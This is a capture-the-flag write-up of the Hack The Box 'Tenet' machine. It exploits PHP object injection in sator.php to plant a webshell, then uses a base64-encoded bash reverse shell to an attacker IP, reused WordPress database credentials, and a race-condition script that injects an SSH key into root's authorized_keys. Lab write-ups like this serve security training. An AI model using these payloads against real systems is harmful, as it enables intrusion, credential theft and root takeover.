>'The world will never know what could happen. And even if they did, they wouldn't care. Because no one cares about the bomb that didn't go off - only the one that did.'  
\- Neil (Tenet)

Hello friends, and welcome back to the mind bending adventures of sp1icer as he takes on the [Tenet box on HTB](https://app.hackthebox.eu/machines/309)! This box holds a well-deserved 4.6 stars at the time of writing on HTB and involves some mean twists and adventures in PHP object injection and deserialization, credential re-use, and taking on a fun race condition to finish it off. Without further adieu, start your engines!

Like always, once you have the IP address of the spawned instance add it to your `/etc/hosts`. Once you've done that, run `nmap -sCV -O -oA tcp-full -p- -v tenet.htb` and see the results come forth from the void:

Okay, so SSH and HTTP are open - not too much to go off of initially, but that's fine (no it's not, _angery_ D:<). We'll start by kicking off both a `nikto` and `gobuster` and visiting the site while those run in the background. I don't really provide the commands here because they didn't give us anything particularly useful, but visiting the site absolutely does. While digging through the articles, you'll notice there's a single lone comment from `neil`:

![Neil providing information about a Sator PHP file, a backup, and that the migration isn't good.](/assets/images/tenet/neil_comment.png)

Neat, so there's the existence of a `sator` file which he mentions is PHP. There's also a backup but the question for all of this - where does it exist? This is where things get a bit weird - I'd have liked to see the box author do something more sensible like a separate DNS entry for the server and hint at it (something like `migration.tenet.htb`, maybe) but I digress. Either way, we still have to _find_ it. Let's use cEWL to get a targeted wordlist (note: you don't _have_ to do this step, but I thought it was cool and worth showing).

For those who don't know, cEWL is a project by Robin Wood (aka [digininja](https://twitter.com/digininja)) built to scrape a site and then generate a great wordlist based on the content of said site. This is a useful skill for situations like we currently have - finding a hidden page - as well as possibly coming up with domain-specific passwords to try with cracking/brute force when needed. I'll let you dig in, but running `cewl -d 3 -w tenet_wl.txt http://tenet.htb/` will net us a nice wordlist that includes neil's comment. Trying this on `http://tenet.htb` provides us....nothing. Wait, what? What now?

You'll notice one thing I _didn't_ do was check the web server running at the box's IP address - as it turns out this was a critical mistake that cost me a fair bit of time. Eventually I went back to the original web server on the IP to do a gobuster and lo and behold, results:

![Gobuster finding sator.php on the original IP.](/assets/images/tenet/sator_php_found.png)

Again, that `cEWL` step wasn't necessary but it was worth practicing. You could have just used intuition to get here. Let's visit the page and see what we get...

![sator.php running and returning some *possibly* useful data.](/assets/images/tenet/sator_php_running.png)

So this interests us for two reasons - the first is it spits out something about grabbing users from a text file. It _also_ says something about a database being updated...hmm. When I read this, I immediately fired off another gobuster using the `raft-small-words.txt` wordlist from SecLists: `gobuster dir -u http://10.129.146.244/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -t 30 -x php,html,txt,zip,bak`. This returned one interesting result among others: `users.txt`. Browsing to this, we don't get much particularly interesting from it. This led to me playing with parameters on the request manually - I added things like `?file=/etc/passwd` and `?users=/etc/passwd` in an attempt to see if I could interfere with its file loading, but no dice. Time to use a bit of intuition again...

Remember that backup file that `neil` mentioned a second ago? Trying `http://<BOX IP>/sator.php.bak` gets us a free file download. Neat! Running `file` against it shows that it's a PHP executable, so we can rename `sator.php.bak` to `sator.php`. The next thing I do usually is a quick `xxd` to preview the contents for any weirdness - remember to double-check your other commands, because [file can be spoofed or produce incorrect results at times](https://unix.stackexchange.com/a/185223). Doing `xxd` should show "normal" bytes - now that we have that, we can open it in a text editor and begin to piece together the _actual_ attack and start working our way to a shell!

## >> THE OBJECT OF MY AFFECTION

 Since it's short, here are the contents of `sator.php` (formerly `sator.php.bak`):

 ```php
<?php                                                                                                              
                                                                                                                   
class DatabaseExport                                                                                               
{                                                                                                                  
        public $user_file = 'users.txt';                                                                           
        public $data = '';                                                                                         

        public function update_db()
        {
                echo '[+] Grabbing users from text file <br>';
                $this-> data = 'Success';
        }

        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
                echo '[] Database updated <br>';
        //      echo 'Gotta get this working properly...';
        }
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();

?>
```

Let's break this down. My methodology when hunting for vulnerabilities when I have source code (either given, or if I steal it) is this: look for data inputs, and figure out how they map to what we can control. In this case I spot something interesting in terms of data input:

```php
$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);
```

For those unfamiliar, PHP allows you to take in data in a myriad of ways but the most common are things like `$_GET`, `$_POST`, and `$_REQUEST`. These are [built-in variables at global scope](https://www.php.net/manual/en/reserved.variables.get.php) that have a parameter attached to the URL and work much the same as a regular variable - they just help bring in outside data from the web server to the program.

In this case, the program is taking _either_ the value passed in to the query string `arepo` _OR_ a blank string - [that's what the `??` does](https://stackoverflow.com/a/53610732). The danger comes in when it passes this value to the `unserialize` function with no sanitization, no checking, basically no defenses whatsoever. This lets us have a shot at finding a PHP Object Injection exploit. Hold on tight friends, this is gonna be a rough ride.

![Holly Logan saying "Fasten your seatbelts."](/assets/images/tenet/hold_on_tight.gif)

For a crash course on PHP Deserialization and Object Injection, [please please _please_ watch IppSec's video on this](https://www.youtube.com/watch?v=HaW15aMzBUM). Seriously, it's freaking _awesome_ and is a large part of why I understood this even a little bit. Additionally I'm going to leave some details out in order to not make this post a novel - I'll do a deserialization in-depth post later, I promise. For my meager explanation, proceed on!

PHP Object Injection is a fickle beast - in order for it to be useful as an attack vector, two conditions must be met (conditions copied from [OWASP's guide](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)):
* The application must have a class which implements a PHP magic method (such as __wakeup or __destruct) that can be used to carry out malicious attacks, or to start a “POP chain”.
* All of the classes used during the attack must be declared when the vulnerable unserialize() is being called, otherwise object autoloading must be supported for such classes.

What does that mean for us? Since our input is coming in (`$_GET['arepo']`) and is immediately passed into `unserialize()`, we have a chance at PHP deserialization here.  Diving into the `DatabaseExport` class to look at the methods available shows us that we have a `__destruct()` magic method, so there's a good chance we can exploit this. Keep in mind that in an actual application there may be a ton more hoops to jump through to find something like this!

So nwo that we've figured out a vector let's begin to weaponize it. This went in roughly 3 steps for me - first, I check that I can control _a_ file; next, I check that I can access a PHP method of some kind; finally, I write out a webshell and use that to do enumeration or get a reverse shell from it. Starting in on writing our exploit for part 1, we need to control and write out to a file; I'll put the whole PoC below and explain after.

```php
<?php

class DatabaseExport {
        public function __construct() {
                $this->user_file = 'sp1icer.txt';
                $this->data = 'hello';
        }
}

$obj = new DatabaseExport;
echo urlencode(serialize($obj));
echo "\n";

?>
```

To start, you have to declare the class that matches the one with the magic method - in our case this is `DatabaseExport`. We use the `__construct()` function to define its behavior on the object's creation. In this case the object is created _when the application takes in our input and passes it to `unserialize()`_. What we're aiming to do with it is set the attributes that we want to control, `user_file` and `data`. Let's revisit the class:

```php
class DatabaseExport                                                                                               
{                                                                                                                  
        public $user_file = 'users.txt';                                                                           
        public $data = '';                                                                                         

        public function update_db()
        {
                echo '[+] Grabbing users from text file <br>';
                $this-> data = 'Success';
        }

        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
                echo '[] Database updated <br>';
        //      echo 'Gotta get this working properly...';
        }
}
```

"But wait," I hear you say, "Wouldn't the $user_file in the class overwrite our values?" Not quite. Those variables are just the initial assignments - they can be overwritten if you provide a value for the object, not the other way around. This is good to know as we can set our own variables as shown in the PoC. Our script will then create the object, serialize it, and wrap it in a URL-safe encoding so that we can put it in the parameter as required. Overall the script is pretty straightforward, but the concept of deserialization attacks not so much. Run the script from the command line with `php <your script>.php` and copy the output. Once you have it copied, go to `http://<BOX IP>/sator.php?arepo=<YOUR PAYLOAD HERE>` and you should see the same output as before, _except that the line about the DB being updated is duplicated!_ That's a good sign indicating that there were not one but _two_ objects instantiated, since the DB line is printed when the `__destruct()` method is called on object deletion. Checking our output file, we see that we did well!

![Our user-controlled output file telling us "hello".](/assets/images/tenet/php_obj_inj_hello.png)

Good, phase one seems to have gone well. Let's modify our PoC to do something a bit more interesting, such as running `phpinfo()` to verify that we have code execution. To do that we change our exploit to the following:

```php
<?php

class DatabaseExport {
        public function __construct() {
                $this->user_file = 'sp1icer.php';
                $this->data = '<?php phpinfo();?>';
        }
}

$obj = new DatabaseExport;
echo urlencode(serialize($obj));
echo "\n";

?>
```

Remember kids, don't be stupid like me - I spent like an hour here trying to get everything to work to no avail. What was the cause, you ask? _I forgot that if we can write a text file, we can probably write other kinds of files too._ Lesson learned: remember to change filetypes and _don't_ leave it sitting as `.txt`, confused why your payload won't execute. Once that runs we see our favorite page in the world...

![Object injection success shown by us printing out the phpinfo function.](/assets/images/tenet/php_obj_inj_phpinfo.png)

We're on a roll now - the last part is always the easiest! Change our attack script over to a webshell payload for great success:

```php
<?php

class DatabaseExport {
        public function __construct() {
                $this->user_file = 'sp1icer.php';
                $this->data = '<?php system($_REQUEST[\'cmd\']);?>';
        }
}

$obj = new DatabaseExport;
echo urlencode(serialize($obj));
echo "\n";

?>
```

Test it the same way:

![Remote code execution proven with the whoami command.](/assets/images/tenet/rce_whoami.png)

After this point, it's fairly straightforward to cram a reverse shell payload into the `arepo` URL parameter. I use our standard from PentestMonkey: `echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTE3LzkwMDEgMD4mMQo=|base64 -d|bash` "Wait," you say. "That's not the PentestMonkey I was looking for!" Correct, dear reader, these _aren't_ the ~~droids~~ shells you're looking for - going through the web means we should base64-encode our payload to minimize the chances of bad characters breaking the payload. The b64 decodes to the following: `echo bash -i  >& /dev/tcp/10.10.14.117/9001 0>&1|base64 -d|bash` Also take note that inside the payload there's actually _two_ spaces between `bash -i` and `>&` - this is intentional in order to pad the base64 string. Originally you would find a `+` in the middle, which in URI terms equates to a space rather than a continuation of the string; this would stop the payload data _very_ short of what's needed. Adding an extra space will change the base64 output and potentially bypass this, so make sure to play with putting space characters in different places if your payload doesn't quite work out!

![Obi-Wan saying "These are not the droids you're looking for."](/assets/images/tenet/not_the_droids.gif)

## >> IT'S A RACE TO THE BOTTOM AND I WON'T LOSE

After _all_ of that effort, we finally have a shell as `www-data`. Now it's time to TTY upgrade, per the usual methods. Maximum effort, right? If we pay attention to where we end up with the initial shell, you'll notice that we start in folders containing the Wordpress content. That's not entirely surprising, but this gives us the opportunity to hunt for any database credentials that might be lying around. A good place to check is `/var/www/html/wordpress/wp-config.php` where it holds the Wordpress database credentials normally. If we poke inside this file we see the following:

![Credentials for neil found in the wp-config.php file.](/assets/images/tenet/neil_creds_found.png)

Wonderful - we now have `neil :: Opera2112` as a potential set of credentials. Often times users will re-use credentials in different places; trying to SSH in as `neil` with the password we just found nets us a valid session! From here I did my standard enumeration using `sudo -l`, which lists out a script at `/usr/local/bin/` as a valid command we can execute.

![Checking sudo -l for neil's account.](/assets/images/tenet/neil_sudo_l.png)

Once that comes back, I immediately `cat` the file out to see what it does since it's not a native binary. The contents are pasted here for convenience:

```bash

This file is actually decently complicated, so let's start by going in order of function calls. `bash` doesn't have a "main" function per se, but it runs in top-to-bottom order (excluding defined functions). Let's start at the bottom outside of the 3 defined functions.

This piece shouldn't be terribly exciting - it's setting an SSH key to a variable and then calling two functions. Let's examine the `addkey` function as it seems to be the first _real_ piece of code.

```bash
addKey() {
        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
        (umask 110; touch $tmpName)
        /bin/echo $key >>$tmpName
        checkFile $tmpName
        /bin/cat $tmpName >>/root/.ssh/authorized_keys
        /bin/rm $tmpName
}
```

Okay so _now_ we have something happening. The script starts with generating a random filename in `/tmp/ssh-XXXXXXXX` - the X's get replaced with random characters - and then it actually creates the file. After this happens, the key from the first script block gets added to that file, then `checkFile` is called. Finally, it tries to add the key to root's `authorized_keys` file (if you don't know what this file does, [check it out here](https://www.ssh.com/academy/ssh/authorized-keys-file)) and deletes the temporary file `/tmp/ssh-XXXXXXXX`. There's an interesting idea in that if we can get our data into the file before it writes to root's `authorized_keys` file, we could add our own in there. That immediately drew my attention, but let's chug on to make sure we have a full understanding of the short program first.

Since we've finished `addKey` and the main function calls `checkAdded` next, let's _check_ that next ;)

```bash
checkAdded() {                                                                                                                                                
        sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)                                                                                                  
        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then                                                                                  
                /bin/echo "Successfully added $sshName to authorized_keys file!"
        else
                /bin/echo "Error in adding $sshName to authorized_keys file!"
        fi                                                                                                                                                    
}
```

This one's pretty short and sweet - it checks the ending of the public key from the beginning to see if the username exists in the `authorized_keys` file. If it's there, then the program returns that the key was successfully added - otherwise it fails. You'll notice I skipped `checkFile` - it's a pretty boring piece of code that doesn't impact the exploit in any way, so I figured why waste time there? Feel free to learn what it does on your own, though!

Moving forward, there's not really any other vectors that I could come up with _other_ than the race condition - we have to create a program to hijack execution flow and insert our public key before the program sends it to root's `authorized_keys` file. Unfortunately for you and I, the program is necessary - I don't know about you but _I_ certainly can't out-speed a computer. Since this post is ending up on the longer side, I'll just show you my solution and explain it below.

```bash
#!/bin/bash

chksum1=$(ls /tmp/ | md5sum | cut -d' ' -f1);

while [[ true ]]; do
        chksum2=$(ls /tmp/ | md5sum | cut -d' ' -f1);
        if [[ "$chksum1" != "$chksum2" ]]; then
                fname=(*);
                echo "[YOUR SSH PUBLIC KEY HERE]" > "${fname[0]}";
        fi
done
```

Enter my script, `/tmp/watchstuff.sh`. Very technical naming convention, I know. Essentially it's a catch-all that I came up with when I noticed that the `ssh-XXXXXX` file was the _first_ file in the directory at all times; it catches and edits that file on the fly. I accomplish it in a few steps:

* First, the program takes a checksum of the `/tmp/` directory and stores it in a variable. The idea for this [came from this post](https://idiallo.com/blog/watching-folder-with-shell-script-bash) on how to watch a folder.
* Next, we enter an infinite loop - this is intentional. Inside the loop, it constantly takes the checksum of `/tmp` in a second variable.
* If at any point the checksums _don't_ match, the program finds the first file in `/tmp` (remember, this always equates to `ssh-XXXXX`) and overwrites it with my own public key.

To use this, we do a few things. Start by generating a new keypair for the box with `ssh-keygen` and then replace the `[YOUR SSH PUBLIC KEY HERE]` section with it. Follow by adding the `watchstuff.sh` file to `/tmp` and triggering it in one SSH session as `neil`. Next establish a _second_ SSH session and transfer the private key onto the box somewhere. Finally, run `sudo -u root /usr/local/bin/enableSSH.sh` to trigger the race condition. Kill the `watchstuff.sh` script and attempt to SSH into root with `ssh -i root_inject root@localhost` - if everything goes to plan, you should see something similar to my root session!

Whew - that was a good bit of a slugfest. We're root and can now turn this into persistence however we'd like as we have the highest permissions. All in all, exploiting the race condition made it feel like we made the program do this to itself:

## >> ROCKEM SOCKEM ROOT-BOTS

After a wild Saturday afternoon, we've managed to tackle PHP deserialization _and_ exploiting race conditions all in one post. I learned quite a bit from this box; even though I was chasing OSWE, I was pretty darn bad at PHP deserialization attacks. I think this box helped solidify and cemented my knowledge on the subject so that's a win in my book. The race condition - well that was _just plain cool_. I hope you've enjoyed this post, I learned quite a few neat tricks from it - as always, ~~make sure to like and subscribe~~ keep on keeping on and happy hacking!

## >> TL;DR FOR MY LAZY FRIENDS

These were my short-form notes while doing the box.

```
1. visit page on port 80, see rotas mention
2. find comment from neil about sator.php file
3. cewl wordlists against the tenet site
	1. `cewl -d 3 -w tenet_wl.txt http://tenet.htb/`
4. dir force on the IP, NOT the hostname
	1. `gobuster dir -u http://10.129.146.244/ -w tenet_wl.txt -t 30 -x php,html,txt,zip,bak`
	2. `gobuster dir -u http://10.129.146.244/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -t 30 -x php,html,txt,zip,bak`
5. find sator.php
6. find users.txt
7. using hint, guess that the file we're looking for is `sator.php.bak` at `http://10.129.146.244/sator.php.bak`
8. look at source code, see that we can do php object injection
9. set up attack_poc - just testing writing to a diff file
10. set up attack - do phpinfo
11. set up attack - do webshell
12. pentestmonkey -> revshell
	1. has issues with some chars in the URL, so base64 encode
	2. `echo 'bash -i  >& /dev/tcp/10.10.14.117/9001 0>&1' | base64`
	3. play with spaces to remove the extra `+` in the middle of the b64 output
13. `http://10.129.146.244/sp1icer.php?cmd=echo%20YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTE3LzkwMDEgMD4mMQo=|base64%20-d|bash`
14. shell as www-data
15. TTY upgrade (https://blog.mrtnrdl.de/infosec/2019/05/23/obtain-a-full-interactive-shell-with-zsh.html)
	1. `python3 -c 'import pty;pty.spawn("/bin/bash");'`
	2. `stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'`
	3. `stty raw -echo; fg`
	4. `stty rows ROWS cols COLS`
	5. `export TERM=xterm-256color`
	6. `exec /bin/bash`
16. find creds in `/var/www/html/wordpress/wp-config.php`
17. ssh in as neil :: Opera2112
18. `sudo -l` to see the script
19. make a keypair: `ssh-keygen -t rsa -b 4096 -f root_inject`
20. Copy over private key
21. Make race condition script
22. execute watchstuff.sh, trigger the sudo command
23. `ssh -i root_inject root@localhost`
24. root.txt
```
